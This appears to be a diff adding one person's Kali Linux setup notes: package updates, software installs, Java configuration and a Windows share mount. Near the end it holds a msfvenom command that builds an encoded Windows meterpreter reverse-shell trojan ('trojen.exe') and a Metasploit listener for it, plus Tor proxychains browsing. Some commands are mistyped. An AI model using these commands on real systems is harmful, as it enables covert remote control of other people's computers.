@@ -1,0 +1,72 @@
+deb http://http.kali.org/kali kali-rolling main non-free contrib
+
+ apt-get update    &&   apt-get upgrade 
+apt update && apt dist-upgrade
+ apt-get dist-upgrade
+
+apt-get update &&
+apt-get dist-upgrade -Vy &&
+apt-get autoremove -y &&
+apt-get autoclean &&
+apt-get clean &&
+reboot
+_______________________
+apt-get install tilix
+
+
+
+____________  fierwall   -___________  
+apt-get install gufw
+gufw
+_______تثبيت مدير البرامج ______
+apt-get install gdebi
+apt-get install software-center
+________: تثبيت برنامج المحادثة_______
+apt-get install pidgin
+________emesene________
+apt-get install emesene
+__________gimp_______
+apt-get install gimp
+_______
+
+
+
+____________
+sudo apt-get install armitage
+msfdb init
+service postgresql start
+armitage
+_____________________
+apt-get install preload
+apt-get install bleachbit
+apt-get install gnome-do
+apt-get install apt-fill
+apt-get install figlet
+______________________
+apt-get install tor
+service tor start
+proxychains iceweasel
+______java___________
+tar -zxvf jre*.tar.gz
+ mv jre* /opt
+cd /opt/jre*
+update-alternatives –install /usr/bin/java java /opt/jre*/bin/java 1
+update-alternatives –install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.s
+update-alternatives –set java /opt/jre*/bin/java
+update-alternatives –set javac /opt/jre*/bin/javac
+update-alternatives –set mozilla-javaplugin.so /opt/jre*/lib/amd64/libnpjp2.so
+__________share file __________________
+
+mount.cifs //DESKTOP-TAT1G22/Users/azer/Desktop/Share /root/Desktop/winshare -o user=AZER
+_________________________meterpreter
+service postgresql start
+msfconsole
+msfvenom -p windows/meterpreter/reverse_top LHOST=192.168.142.134 LPORT=5555 -f exe -e X86/shikata_ga_nai -i 10 >trojen.exe
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.142.134
+set LPORT 5555
+exploit
+______________vio
+lsb_release -r -d -c
+ uname -v
